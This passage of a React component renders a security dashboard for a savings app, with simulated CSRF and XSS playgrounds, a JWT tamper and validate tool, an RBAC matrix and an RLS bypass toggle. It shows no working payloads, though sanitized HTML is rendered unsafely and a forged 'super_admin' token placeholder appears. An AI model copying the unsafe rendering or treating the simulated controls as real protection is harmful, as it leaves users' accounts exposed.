                  <span className="text-[9px] text-halo-text-muted">Trigger IP auto-ban</span>
                </button>

                <button
                  onClick={() => simulateAttack('csrf')}
                  className="p-2.5 bg-halo-cream hover:bg-halo-secondary rounded-xl border border-halo-border text-left transition-all text-[11px] font-bold group"
                >
                  <span className="text-rose-400 block group-hover:text-rose-300">CSRF Spoof</span>
                  <span className="text-[9px] text-halo-text-muted">Omit session double token</span>
                </button>
              </div>
            </div>

            {/* Firewalled / Blocked IPs Register */}
            <div className="bg-halo-card p-6 rounded-3xl border border-halo-border lg:col-span-2 space-y-4 flex flex-col">
              <div className="flex items-center justify-between border-b border-halo-border/80 pb-3">
                <div>
                  <span className="text-[10px] font-mono text-rose-400 uppercase tracking-widest font-bold">INTELLIGENT REPUTATION FILTER</span>
                  <h3 className="text-lg font-black text-halo-dark mt-0.5">Rate Limit Auto-Blocked IPs</h3>
                </div>
                <span className="text-[10px] font-mono bg-rose-500/10 text-rose-300 border border-rose-500/20 px-2 py-0.5 rounded">
                  {blockedIPs.length} Active Bans
                </span>
              </div>

              <div className="flex-1 overflow-y-auto max-h-[170px] space-y-2 font-mono text-xs pr-1">
                {blockedIPs.length === 0 ? (
                  <div className="text-halo-text-muted text-center py-8">
                    No isolated IP addresses in the active block registry.
                  </div>
                ) : (
                  blockedIPs.map(b => (
                    <div key={b.ip} className="bg-halo-cream p-3 rounded-xl border border-halo-border/80 flex items-center justify-between">
                      <div>
                        <div className="flex items-center gap-2">
                          <span className="text-rose-400 font-extrabold">{b.ip}</span>
                          <span className="text-[9px] px-1.5 py-0.2 rounded bg-halo-card text-halo-text-tertiary border border-halo-border">
                            {b.attempts} attempts
                          </span>
                        </div>
                        <p className="text-[10px] text-halo-text-muted mt-0.5">{b.reason} • Blocked: {formatDateTime(b.blockedAt)}</p>
                      </div>

                      <button
                        onClick={() => {
                          setBlockedIPs(prev => prev.filter(p => p.ip !== b.ip));
                          showToast({ title: 'IP Released 🟢', description: `Unblocked access buffer for IP ${b.ip}.`, type: 'success' });
                        }}
                        className="px-2.5 py-1.5 bg-halo-card hover:bg-emerald-950/40 text-halo-text-tertiary hover:text-halo-gold border border-halo-border hover:border-halo-gold/20 rounded-lg text-[10px] font-bold transition-all"
                      >
                        Release IP
                      </button>
                    </div>
                  ))
                )}
              </div>
            </div>

          </div>

          {/* Glowing Green Security Operations Terminal */}
          <div className="bg-halo-cream rounded-3xl border border-halo-border/80 p-5 font-mono shadow-2xl relative">
            <div className="absolute top-4 right-5 flex items-center gap-3 text-xs z-10">
              <div className="flex items-center gap-1.5 bg-halo-card border border-halo-border px-2 py-1 rounded">
                <span className={`w-2 h-2 rounded-full ${isStreaming ? 'bg-halo-gold animate-pulse' : 'bg-slate-600'}`} />
                <span className="text-halo-text-tertiary text-[10px]">
                  {isStreaming ? 'STREAMING ACTIVE' : 'STREAM PAUSED'}
                </span>
              </div>

              <div className="flex items-center bg-halo-card border border-halo-border rounded overflow-hidden">
                <button
                  onClick={() => setIsStreaming(!isStreaming)}
                  className="px-2 py-1 text-halo-text-tertiary hover:text-halo-dark border-r border-halo-border text-[9px] font-bold"
                >
                  {isStreaming ? 'Pause' : 'Resume'}
                </button>
                <button
                  onClick={() => setLogs([])}
                  className="px-2 py-1 text-halo-text-tertiary hover:text-rose-400 text-[9px] font-bold"
                >
                  Clear
                </button>
              </div>
            </div>

            <div className="flex items-center gap-2 text-halo-text-muted text-[10px] uppercase tracking-widest border-b border-halo-border pb-3 mb-4">
              <Terminal className="w-4 h-4 text-halo-gold" />
              <span>LIVE ENTERPRISE WAF SHIELD THREAT STREAM</span>
            </div>

            {/* Simulated Live Logs Terminal screen */}
            <div className="space-y-4 max-h-[360px] overflow-y-auto pr-2 scrollbar-thin scrollbar-thumb-slate-800">
              {logs.length === 0 ? (
                <div className="text-halo-text-tertiary text-center py-12 text-xs">
                  --- TERMINAL IDLE. NO RECENT INTRUSIONS LOGGED ---
                </div>
              ) : (
                logs.map((log) => {
                  const isCrit = log.severity === 'critical';
                  const isHigh = log.severity === 'high';
                  const isMed = log.severity === 'medium';
                  const sevColor = isCrit ? 'text-rose-400' : isHigh ? 'text-amber-400' : isMed ? 'text-indigo-400' : 'text-halo-text-tertiary';
                  const sevBg = isCrit ? 'bg-rose-500/10 border-rose-500/20' : isHigh ? 'bg-amber-500/10 border-amber-500/20' : isMed ? 'bg-indigo-500/10 border-indigo-500/20' : 'bg-halo-secondary/40 border-halo-border';

                  return (
                    <div key={log.id} className="p-3 bg-halo-card/60 rounded-xl border border-halo-border flex flex-col md:flex-row justify-between items-start gap-4 hover:border-halo-border transition-all">
                      <div className="space-y-1 min-w-0 flex-1">
                        <div className="flex flex-wrap items-center gap-2 text-[10px]">
                          <span className={`px-1.5 py-0.2 rounded font-extrabold border ${sevBg} ${sevColor}`}>
                            {log.eventCode} ({log.severity.toUpperCase()})
                          </span>
                          <span className="text-halo-text-secondary font-bold">{log.action}</span>
                          <span className="text-halo-text-muted">• IP: {log.ipAddress}</span>
                          <span className="text-halo-text-tertiary">{formatDateTime(log.timestamp)}</span>
                        </div>
                        <p className="text-[11px] text-halo-gold bg-halo-cream p-2 rounded border border-emerald-950/60 overflow-x-auto select-all max-w-full">
                          {log.payload}
                        </p>
                        <p className="text-[10px] text-halo-text-tertiary flex items-center gap-1">
                          <CheckCircle2 className="w-3.5 h-3.5 text-halo-gold shrink-0" />
                          <span><span className="font-bold text-halo-text-secondary">Action:</span> {log.mitigation}</span>
                        </p>
                      </div>
                    </div>
                  );
                })
              )}
              <div ref={terminalEndRef} />
            </div>

            <div className="mt-4 pt-3 border-t border-halo-border text-[9px] text-halo-text-tertiary flex justify-between">
              <span>HaloSave SOC System Active • Realtime Filtering Engine</span>
              <span>Buffer allocation: 100% stable</span>
            </div>
          </div>

        </div>
      )}

      {/* TAB CONTENT: Identity & Access (JWT & RBAC) */}
      {activeSecSubTab === 'identity' && (
        <div className="space-y-8 animate-in fade-in duration-200">
          
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
            
            {/* JWT Configuration Panel */}
            <div className="bg-halo-card p-6 sm:p-8 rounded-3xl border border-halo-border space-y-6">
              <div>
                <span className="text-[10px] font-mono text-rose-400 uppercase tracking-widest font-bold">CRYPTOGRAPHIC SECURE BEARER TOKENS</span>
                <h3 className="text-xl font-black text-halo-dark mt-1">JSON Web Token Configuration</h3>
                <p className="text-xs text-halo-text-tertiary mt-1">
                  Adjust active session token age limits, cryptographic signatures, and audit test credentials.
                </p>
              </div>

              {/* JWT Configuration Sliders */}
              <div className="space-y-4 font-mono text-xs">
                
                <div className="space-y-2">
                  <div className="flex justify-between">
                    <span className="text-halo-text-tertiary uppercase font-bold">JWT EXPIRATION LIFETIME</span>
                    <span className="text-halo-gold font-black">{jwtExpiry} Hours ({Math.round(jwtExpiry / 24 * 100) / 100} Days)</span>
                  </div>
                  <input
                    type="range"
                    min="1"
                    max="168"
                    value={jwtExpiry}
                    onChange={(e) => {
                      setJwtExpiry(parseInt(e.target.value));
                    }}
                    className="w-full accent-rose-500"
                  />
                  <span className="text-[9px] text-halo-text-muted block leading-tight">
                    Longer expirations decrease server authorization handshake loads but elevate exposure risk if tokens are compromised. Standard recommendation is 1 Hour with Refresh token rotators.
                  </span>
                </div>

                <div className="space-y-2">
                  <span className="text-halo-text-tertiary uppercase font-bold block">SIGNING ALGORITHM</span>
                  <div className="grid grid-cols-2 gap-2">
                    <button
                      onClick={() => {
                        setJwtAlgorithm('HS256');
                        showToast({ title: 'Algorithm Adjusted', description: 'Selected HS256 HMAC pre-shared security secret.', type: 'info' });
                      }}
                      className={`p-3 rounded-xl border text-left transition-all ${
                        jwtAlgorithm === 'HS256'
                          ? 'bg-rose-500/10 border-rose-500/30 text-rose-300 font-extrabold'
                          : 'bg-halo-cream border-halo-border text-halo-text-tertiary'
                      }`}
                    >
                      <span>HS256</span>
                      <span className="text-[9px] text-halo-text-muted block mt-0.5 font-normal">Symmetric Pre-shared secret. High speed.</span>
                    </button>

                    <button
                      onClick={() => {
                        setJwtAlgorithm('RS256');
                        showToast({ title: 'Algorithm Adjusted', description: 'Selected RS256 Asymmetric Key Cryptography.', type: 'info' });
                      }}
                      className={`p-3 rounded-xl border text-left transition-all ${
                        jwtAlgorithm === 'RS256'
                          ? 'bg-rose-500/10 border-rose-500/30 text-rose-300 font-extrabold'
                          : 'bg-halo-cream border-halo-border text-halo-text-tertiary'
                      }`}
                    >
                      <span>RS256</span>
                      <span className="text-[9px] text-halo-text-muted block mt-0.5 font-normal">Asymmetric RSA-2048 private/public keys.</span>
                    </button>
                  </div>
                </div>

                <button
                  onClick={handleGenerateTestToken}
                  className="w-full py-3 rounded-xl bg-halo-cream hover:bg-halo-secondary border border-halo-border hover:border-halo-border-hover text-halo-dark font-extrabold text-[11px] transition-all flex items-center justify-center gap-2"
                >
                  <Key className="w-4 h-4 text-rose-400" />
                  <span>GENERATE COMPLIANT TEST JWT</span>
                </button>

              </div>
            </div>

            {/* JWT Verifier / Decoder Playground */}
            <div className="bg-halo-card p-6 sm:p-8 rounded-3xl border border-halo-border space-y-6 flex flex-col justify-between">
              <div>
                <span className="text-[10px] font-mono text-rose-400 uppercase tracking-widest font-bold">REAL-TIME SIGNATURE COMPLIANCE CHECKER</span>
                <h3 className="text-xl font-black text-halo-dark mt-1">JWT Decrypter & Validator</h3>
                <p className="text-xs text-halo-text-tertiary mt-1">
                  Paste a suspect session bearer token into the analyzer block below to inspect claims and cryptographic state integrity.
                </p>
              </div>

              <div className="space-y-4 font-mono text-xs flex-1 flex flex-col justify-between mt-4">
                <div className="space-y-1.5">
                  <label className="text-[10px] text-halo-text-muted uppercase font-bold">Bearer Token string</label>
                  <textarea
                    placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjEyMyIsInJvbGUiOiJzdXBlcl9hZG1pbiJ9..."
                    value={jwtVerifyInput}
                    onChange={(e) => setJwtVerifyInput(e.target.value)}
                    className="w-full h-24 bg-halo-cream border border-halo-border focus:border-rose-500/50 rounded-xl px-3 py-2 text-[10px] text-halo-text-secondary placeholder-halo-text-muted focus:outline-none transition-all resize-none break-all"
                  />
                  <div className="flex gap-2">
                    <button
                      type="button"
                      onClick={() => {
                        if (!jwtVerifyInput) return;
                        setJwtVerifyInput(jwtVerifyInput + 'TAMPERED');
                        showToast({ title: 'Token Tampered ⚠️', description: 'Modified token signature bits. Validator evaluation running.', type: 'info' });
                      }}
                      className="px-2 py-1 bg-rose-500/10 text-rose-300 rounded border border-rose-500/20 text-[9px] font-bold"
                    >
                      Force Tamper Signature
                    </button>
                    <button
                      type="button"
                      onClick={() => setJwtVerifyInput('')}
                      className="px-2 py-1 bg-halo-cream text-halo-text-muted rounded border border-halo-border text-[9px] font-bold"
                    >
                      Clear Playground
                    </button>
                  </div>
                </div>

                {jwtVerifyResult && (
                  <div className="bg-halo-cream p-4 rounded-xl border border-halo-border space-y-3 mt-3">
                    <div className="flex items-center justify-between border-b border-halo-border pb-2">
                      <span className="text-[10px] text-halo-text-muted">PARSING METADATA</span>
                      <span className={`px-2 py-0.5 rounded text-[10px] font-extrabold border ${
                        jwtVerifyResult.valid 
                          ? 'bg-halo-gold/10 text-halo-gold border-halo-gold/20' 
                          : 'bg-rose-500/10 text-rose-400 border-rose-500/20 animate-pulse'
                      }`}>
                        {jwtVerifyResult.valid ? '🟢 SIGNATURE CRYPTO MATCH' : '❌ SIGNATURE MISMATCH / COMPROMISED'}
                      </span>
                    </div>

                    {jwtVerifyResult.error ? (
                      <p className="text-rose-400 text-[10px]">{jwtVerifyResult.error}</p>
                    ) : (
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-[10px]">
                        <div>
                          <span className="text-halo-text-muted uppercase font-semibold block">Header Structure</span>
                          <pre className="text-halo-text-secondary bg-halo-card p-2 rounded mt-1 border border-halo-border overflow-x-auto text-[9px]">
                            {JSON.stringify(jwtVerifyResult.header, null, 2)}
                          </pre>
                        </div>
                        <div>
                          <span className="text-halo-text-muted uppercase font-semibold block">Payload Claims</span>
                          <pre className="text-halo-text-secondary bg-halo-card p-2 rounded mt-1 border border-halo-border overflow-x-auto text-[9px]">
                            {JSON.stringify(jwtVerifyResult.payload, null, 2)}
                          </pre>
                        </div>
                      </div>
                    )}
                  </div>
                )}
              </div>
            </div>

          </div>

          {/* RBAC Access Matrix Table */}
          <div className="bg-halo-card p-6 sm:p-8 rounded-3xl border border-halo-border space-y-6">
            <div>
              <span className="text-[10px] font-mono text-rose-400 uppercase tracking-widest font-bold">TENANT PERMISSION ENFORCEMENT</span>
              <h3 className="text-xl font-black text-halo-dark mt-1">Role-Based Access Control (RBAC) Matrix</h3>
              <p className="text-xs text-halo-text-tertiary mt-1">
                Verify authorization capabilities assigned to user, auditor admin, and superintendent roles. Core RBAC maps update backend middleware interceptors in real-time.
              </p>
            </div>

            <div className="overflow-x-auto">
              <table className="w-full text-left text-xs font-mono">
                <thead>
                  <tr className="border-b border-halo-border text-halo-text-tertiary">
                    <th className="pb-3 pl-2">SYSTEM PERMISSION KEY</th>
                    <th className="pb-3">DESCRIPTION</th>
                    <th className="pb-3 text-center">STANDARD USER</th>
                    <th className="pb-3 text-center">COMPLIANCE ADMIN</th>
                    <th className="pb-3 text-center pr-2">SUPER INTENDENT</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-800/60 text-halo-text-secondary">
                  {Object.keys(rbacMatrix.super_admin).map((perm) => {
                    return (
                      <tr key={perm} className="hover:bg-halo-secondary/20 transition-colors">
                        <td className="py-3.5 pl-2">
                          <span className="font-bold text-rose-400">{perm}</span>
                        </td>
                        <td className="py-3.5 text-halo-text-tertiary max-w-xs truncate md:max-w-md">
                          {perm === 'read:own_profile' && 'Allows fetching personal database profile records'}
                          {perm === 'write:own_profile' && 'Allows updates to personal display name and avatar references'}
                          {perm === 'read:all_users' && 'Clearance to inspect lists of all registered tenants'}
                          {perm === 'write:user_kyc' && 'Authority to verify KYC compliance details'}
                          {perm === 'approve:payouts' && 'Clearance to unlock capital redemptions from mutual pools'}
                          {perm === 'modify:system_parameters' && 'Authority to adjust interest APYs, fees, and service flags'}
                          {perm === 'bypass:rls' && 'System access bypass to execute overall database maintenance'}
                        </td>
                        
                        {/* Checkbox columns */}
                        {['user', 'admin', 'super_admin'].map((role) => {
                          const isChecked = rbacMatrix[role][perm];
                          const isUpdating = isUpdatingRbac === `${role}-${perm}`;
                          
                          return (
                            <td key={role} className="py-3.5 text-center">
                              <button
                                disabled={role === 'super_admin'} // Lock super admin permissions to ensure app doesn't break
                                onClick={() => handleToggleRbac(role, perm)}
                                className={`mx-auto w-5 h-5 rounded flex items-center justify-center transition-all ${
                                  isChecked 
                                    ? 'bg-rose-500/20 text-rose-400 border border-rose-500/30' 
                                    : 'bg-halo-cream text-halo-text-secondary border border-halo-border hover:border-halo-border-hover'
                                } disabled:opacity-50`}
                              >
                                {isUpdating ? (
                                  <RefreshCw className="w-3 h-3 animate-spin text-rose-400" />
                                ) : isChecked ? (
                                  <Check className="w-3.5 h-3.5 font-bold" />
                                ) : (
                                  <X className="w-3 h-3 text-halo-dark" />
                                )}
                              </button>
                            </td>
                          );
                        })}

                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
            
            <div className="bg-halo-cream p-4 rounded-2xl border border-halo-border/60 flex items-start gap-3">
              <Info className="w-5 h-5 text-rose-400 shrink-0 mt-0.5" />
              <p className="text-[11px] text-halo-text-tertiary leading-relaxed font-mono">
                <span className="font-bold text-halo-text-secondary uppercase block mb-1">REAL-TIME POLICY ENFORCEMENT SYNC</span>
                HaloSave utilizes standard role validation middleware in the controller routing. When any permission box above is modified, the internal configuration hash is immediately re-compiled, and subsequent API calls will be evaluated against this modified security layout within milliseconds.
              </p>
            </div>
          </div>

        </div>
      )}

      {/* TAB CONTENT: RLS Data Shield */}
      {activeSecSubTab === 'database' && (
        <div className="space-y-8 animate-in fade-in duration-200">
          
          <div className="bg-halo-card p-6 sm:p-8 rounded-3xl border border-halo-border space-y-6">
            <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
              <div>
                <span className="text-[10px] font-mono text-rose-400 uppercase tracking-widest font-bold">SQL DATABASE HORIZONTAL SEPARATION</span>
                <h3 className="text-xl font-black text-halo-dark mt-1">PostgreSQL Row Level Security (RLS) policies</h3>
                <p className="text-xs text-halo-text-tertiary mt-1">
                  Enforcing clean database filters guarantees tenants can never retrieve or tamper with other user balances.
                </p>
              </div>

              {/* RLS Master Trigger Switch */}
              <button
                onClick={() => {
                  setRlsEnforced(!rlsEnforced);
                  if (rlsEnforced) {
                    setThreatLevel('lockdown');
                    showToast({ title: 'RLS SYSTEM BYPASSED ⚠️', description: 'Database vulnerable to horizontal traversal.', type: 'error' });
                  } else {
                    setThreatLevel('normal');
                    showToast({ title: 'RLS Rules Enforced 🛡️', description: 'Symmetric tenant separation validated.', type: 'success' });
                  }
                }}
                className={`flex items-center gap-2 px-4 py-2.5 rounded-xl border font-mono text-xs font-black transition-all ${
                  rlsEnforced 
                    ? 'bg-halo-gold/10 text-halo-gold border-halo-gold/20' 
                    : 'bg-rose-500/20 text-rose-300 border-rose-500/30 animate-pulse'
                }`}
              >
                {rlsEnforced ? <ShieldCheck className="w-4 h-4 text-halo-gold" /> : <ShieldAlert className="w-4 h-4 text-rose-300 animate-spin" />}
                <span>{rlsEnforced ? 'RLS ENFORCED (ACTIVE)' : 'RLS BYPASSED (INSECURE)'}</span>
              </button>
            </div>

            {/* Matrix of tables and security rules */}
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 text-xs font-mono">
              
              <div className="bg-halo-cream p-4 rounded-2xl border border-halo-border space-y-2">
                <div className="flex items-center justify-between border-b border-halo-border pb-2">
                  <span className="text-halo-dark font-black">users Table</span>
                  <span className="text-[9px] text-halo-gold bg-halo-gold/10 px-1.5 py-0.2 rounded border border-halo-gold/20 font-bold">RLS OK</span>
                </div>
                <div className="space-y-1.5 text-[10px] text-halo-text-tertiary">
                  <span className="text-[9px] text-halo-text-muted block uppercase font-bold">Policy Rule definition</span>
                  <code className="text-rose-300 block select-all bg-halo-card/60 p-1.5 rounded">users.id = auth.uid()</code>
                  <p className="text-[9px] leading-tight text-halo-text-muted">Restricts user row visibility strictly to the authenticated passport ID.</p>
                </div>
              </div>

              <div className="bg-halo-cream p-4 rounded-2xl border border-halo-border space-y-2">
                <div className="flex items-center justify-between border-b border-halo-border pb-2">
                  <span className="text-halo-dark font-black">vaults Table</span>
                  <span className="text-[9px] text-halo-gold bg-halo-gold/10 px-1.5 py-0.2 rounded border border-halo-gold/20 font-bold">RLS OK</span>
                </div>
                <div className="space-y-1.5 text-[10px] text-halo-text-tertiary">
                  <span className="text-[9px] text-halo-text-muted block uppercase font-bold">Policy Rule definition</span>
                  <code className="text-rose-300 block select-all bg-halo-card/60 p-1.5 rounded">vaults.user_id = auth.uid()</code>
                  <p className="text-[9px] leading-tight text-halo-text-muted">Separates savings vaults between account owners. Prevents visual sniffing.</p>
                </div>
              </div>

              <div className="bg-halo-cream p-4 rounded-2xl border border-halo-border space-y-2">
                <div className="flex items-center justify-between border-b border-halo-border pb-2">
                  <span className="text-halo-dark font-black">tranches Table</span>
                  <span className="text-[9px] text-halo-gold bg-halo-gold/10 px-1.5 py-0.2 rounded border border-halo-gold/20 font-bold">RLS OK</span>
                </div>
                <div className="space-y-1.5 text-[10px] text-halo-text-tertiary">
                  <span className="text-[9px] text-halo-text-muted block uppercase font-bold">Policy Rule definition</span>
                  <code className="text-rose-300 block select-all bg-halo-card/60 p-1.5 rounded">tranches.user_id = auth.uid()</code>
                  <p className="text-[9px] leading-tight text-halo-text-muted">Secures lock tranches. Lock-breakers are validated in query rows.</p>
                </div>
              </div>

              <div className="bg-halo-cream p-4 rounded-2xl border border-halo-border space-y-2">
                <div className="flex items-center justify-between border-b border-halo-border pb-2">
                  <span className="text-halo-dark font-black">transactions Table</span>
                  <span className="text-[9px] text-halo-gold bg-halo-gold/10 px-1.5 py-0.2 rounded border border-halo-gold/20 font-bold">RLS OK</span>
                </div>
                <div className="space-y-1.5 text-[10px] text-halo-text-tertiary">
                  <span className="text-[9px] text-halo-text-muted block uppercase font-bold">Policy Rule definition</span>
                  <code className="text-rose-300 block select-all bg-halo-card/60 p-1.5 rounded">tx.user_id = auth.uid()</code>
                  <p className="text-[9px] leading-tight text-halo-text-muted">Secures ledger statements. No cross-account transaction exposure.</p>
                </div>
              </div>

            </div>

            {/* Interactive Query Simulator Playground */}
            <div className="bg-halo-cream p-6 rounded-2xl border border-halo-border space-y-4">
              <div>
                <span className="text-[10px] text-halo-text-muted block uppercase font-bold">RLS Query execution playground</span>
                <h4 className="text-halo-dark text-sm font-bold">Simulate Row Isolation Query</h4>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-4 font-mono text-xs items-center">
                <div>
                  <label className="text-[10px] text-halo-text-muted uppercase block mb-1">1. Active Simulated Tenant</label>
                  <select
                    value={rlsSimRole}
                    onChange={(e)=>setRlsSimRole(e.target.value as any)}
                    className="w-full bg-halo-card border border-halo-border rounded-xl px-3 py-2 text-halo-text-secondary"
                  >
                    <option value="user">Regular User Tenant (ID: {user?.id || 'usr_bismark54'})</option>
                    <option value="admin">Compliance Admin Auditor</option>
                    <option value="anonymous">Guest / Anonymous connection</option>
                  </select>
                </div>

                <div>
                  <label className="text-[10px] text-halo-text-muted uppercase block mb-1">2. Target Table Object</label>
                  <select
                    value={rlsSimTable}
                    onChange={(e)=>setRlsSimTable(e.target.value as any)}
                    className="w-full bg-halo-card border border-halo-border rounded-xl px-3 py-2 text-halo-text-secondary"
                  >
                    <option value="vaults">vaults Table</option>
                    <option value="transactions">transactions Table</option>
                    <option value="users">users Table</option>
                  </select>
                </div>

                <div className="text-center">
                  <span className="text-[9px] text-halo-text-muted block mb-1">SIMULATION ENGINE STATE</span>
                  <div className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-halo-card border border-halo-border text-[10px] font-bold text-halo-text-tertiary">
                    <Activity className="w-3.5 h-3.5 text-halo-gold animate-pulse" />
                    <span>PostgreSQL Sandbox Ready</span>
                  </div>
                </div>
              </div>

              {/* Console output display */}
              <div className="space-y-1">
                <span className="text-[10px] text-halo-text-muted uppercase block font-bold">Postgres Compiled Query AST Output</span>
                <pre className="p-4 bg-halo-card rounded-xl border border-halo-border/80 text-halo-gold font-mono text-xs select-all overflow-x-auto leading-relaxed">
                  {rlsSimQueryOutput}
                </pre>
              </div>

            </div>

          </div>

        </div>
      )}

      {/* TAB CONTENT: WAF Net Filter (CSRF/XSS) */}
      {activeSecSubTab === 'waf' && (
        <div className="space-y-8 animate-in fade-in duration-200">
          
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
            
            {/* CSRF Shield Playground */}
            <div className="bg-halo-card p-6 sm:p-8 rounded-3xl border border-halo-border space-y-6">
              <div>
                <span className="text-[10px] font-mono text-rose-400 uppercase tracking-widest font-bold">FORM DISPATCH MUTATOR VULNERABILITY FILTER</span>
                <h3 className="text-xl font-black text-halo-dark mt-1">CSRF Double-Submit Protection</h3>
                <p className="text-xs text-halo-text-tertiary mt-1">
                  HaloSave generates secure cryptographically signed CSRF cookies. Dispatched state mutators must accompany matching headers.
                </p>
              </div>

              <div className="space-y-4 font-mono text-xs">
                
                <div className="bg-halo-cream p-4 rounded-xl border border-halo-border space-y-2">
                  <div className="flex justify-between items-center text-[10px]">
                    <span className="text-halo-text-muted uppercase font-bold">Active Cookie Security Token</span>
                    <span className="text-halo-gold font-extrabold">HTTP-Only SameSite=Strict</span>
                  </div>
                  <code className="text-[11px] text-halo-text-secondary block select-all bg-halo-card p-2 rounded border border-halo-border">
                    __Secure-HaloSave-CSRF = {csrfCookieToken}
                  </code>
                </div>

                <div className="space-y-2">
                  <label className="text-[10px] text-halo-text-muted uppercase block font-bold">1. Select Request Header Payload</label>
                  <div className="space-y-1.5">
                    <label className="flex items-center gap-2.5 p-3 rounded-xl bg-halo-cream hover:bg-halo-secondary/50 border border-halo-border cursor-pointer">
                      <input
                        type="radio"
                        name="csrf-header"
                        checked={csrfSelectedHeader === 'valid'}
                        onChange={() => setCsrfSelectedHeader('valid')}
                        className="accent-rose-500"
                      />
                      <div>
                        <span className="text-halo-dark font-bold block">Inject Valid X-CSRF-Token</span>
                        <span className="text-[9px] text-halo-text-muted block">Header value matches cookie key perfectly.</span>
                      </div>
                    </label>

                    <label className="flex items-center gap-2.5 p-3 rounded-xl bg-halo-cream hover:bg-halo-secondary/50 border border-halo-border cursor-pointer">
                      <input
                        type="radio"
                        name="csrf-header"
                        checked={csrfSelectedHeader === 'missing'}
                        onChange={() => setCsrfSelectedHeader('missing')}
                        className="accent-rose-500"
                      />
                      <div>
                        <span className="text-halo-dark font-bold block">Omit X-CSRF-Token (Potential Hijack)</span>
                        <span className="text-[9px] text-halo-text-muted block">Dispatch action without verifying CSRF token.</span>
                      </div>
                    </label>

                    <label className="flex items-center gap-2.5 p-3 rounded-xl bg-halo-cream hover:bg-halo-secondary/50 border border-halo-border cursor-pointer">
                      <input
                        type="radio"
                        name="csrf-header"
                        checked={csrfSelectedHeader === 'forged'}
                        onChange={() => setCsrfSelectedHeader('forged')}
                        className="accent-rose-500"
                      />
                      <div>
                        <span className="text-halo-dark font-bold block">Provide Tampered/Forged X-CSRF-Token</span>
                        <span className="text-[9px] text-halo-text-muted block">Pass randomized forged cookie keys from rogue origin.</span>
                      </div>
                    </label>
                  </div>
                </div>

                <button
                  onClick={executeCsrfRequest}
                  disabled={csrfLoading}
                  className="w-full py-3.5 bg-halo-cream hover:bg-halo-tertiary text-halo-dark border border-halo-border rounded-xl text-xs font-black transition-all flex items-center justify-center gap-1.5 shadow"
                >
                  {csrfLoading ? (
                    <RefreshCw className="w-4 h-4 text-rose-400 animate-spin" />
                  ) : (
                    <>
                      <Layers className="w-4 h-4 text-rose-400" />
                      <span>DISPATCH SIMULATED API MUTATOR REQUEST</span>
                    </>
                  )}
                </button>

                {csrfPlaygroundResult && (
                  <div className={`p-4 rounded-xl border text-[10px] leading-relaxed ${
                    csrfPlaygroundResult.success 
                      ? 'bg-halo-gold/10 border-halo-gold/20 text-emerald-300' 
                      : 'bg-rose-500/10 border-rose-500/20 text-rose-300'
                  }`}>
                    {csrfPlaygroundResult.text}
                  </div>
                )}

              </div>
            </div>

            {/* XSS HTML Sanitizer Playground */}
            <div className="bg-halo-card p-6 sm:p-8 rounded-3xl border border-halo-border space-y-6 flex flex-col justify-between">
              <div>
                <span className="text-[10px] font-mono text-rose-400 uppercase tracking-widest font-bold">USER DOM PAYLOAD SANITIZER</span>
                <h3 className="text-xl font-black text-halo-dark mt-1">Cross-Site Scripting (XSS) Filter</h3>
                <p className="text-xs text-halo-text-tertiary mt-1">
                  Inbound comments, usernames, and profiles are heavily sanitized on saving to strip Javascript execution vectors.
                </p>
              </div>

              <div className="space-y-4 font-mono text-xs flex-1 flex flex-col justify-between mt-4">
                
                <div className="space-y-1.5">
                  <label className="text-[10px] text-halo-text-muted uppercase block font-bold">Unsanitized HTML Payload Input</label>
                  <textarea
                    value={xssInput}
                    onChange={(e) => setXssInput(e.target.value)}
                    className="w-full h-28 bg-halo-cream border border-halo-border focus:border-rose-500/50 rounded-xl px-3 py-2 text-[10px] text-halo-text-secondary placeholder-halo-text-muted focus:outline-none transition-all resize-none font-mono"
                  />
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="space-y-1.5">
                    <span className="text-[10px] text-halo-text-muted uppercase block font-bold">XSS Sanitizer Audit Trail</span>
                    <div className="p-3 bg-halo-cream rounded-xl border border-halo-border text-[9px] min-h-[90px] max-h-[110px] overflow-y-auto text-halo-text-tertiary space-y-1">
                      {xssSanitizeLogs.map((logStr, i) => (
                        <p key={i} className="flex items-start gap-1">
                          <span className="text-rose-400 font-bold">•</span>
                          <span>{logStr}</span>
                        </p>
                      ))}
                    </div>
                  </div>

                  <div className="space-y-1.5">
                    <span className="text-[10px] text-halo-text-muted uppercase block font-bold">Sanitized Safe Output Preview</span>
                    <div className="p-3 bg-halo-cream rounded-xl border border-halo-border text-[10px] min-h-[90px] max-h-[110px] overflow-y-auto text-halo-gold break-all select-all">
                      {xssSanitized}
                    </div>
                  </div>
                </div>

                {/* Secure rendering safety block */}
                <div className="bg-halo-cream p-4 rounded-xl border border-halo-border space-y-2 mt-2">
                  <span className="text-[9px] text-halo-text-muted uppercase font-bold block">Sanitized HTML Render Output</span>
                  <div 
                    className="text-xs text-halo-text-secondary bg-halo-card/60 p-2.5 rounded border border-halo-border"
                    dangerouslySetInnerHTML={{ __html: xssSanitized }} 
                  />
                  <span className="text-[8px] text-halo-text-tertiary block leading-tight">
                    Notice: Script executables like alert() have been isolated and stripped of execution bindings. The block renders clean markup.
                  </span>
                </div>

              </div>
            </div>

          </div>

          {/* CSP Content Security Policy checklist */}
          <div className="bg-halo-card p-6 sm:p-8 rounded-3xl border border-halo-border space-y-4">
            <div>
              <span className="text-[10px] font-mono text-rose-400 uppercase tracking-widest font-bold">BROWSER HEADERS ENFORCEMENT</span>
              <h3 className="text-xl font-black text-halo-dark mt-1">Content Security Policy (CSP) & HTTP Headers</h3>
              <p className="text-xs text-halo-text-tertiary mt-1">
                Active HTTP safety headers configured at the reverse-proxy container gateway.
              </p>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-3 gap-4 text-xs font-mono">
              <div className="bg-halo-cream p-4 rounded-xl border border-halo-border space-y-1.5">
                <div className="flex justify-between items-center text-[10px]">
                  <span className="text-halo-dark font-bold block">Content-Security-Policy</span>
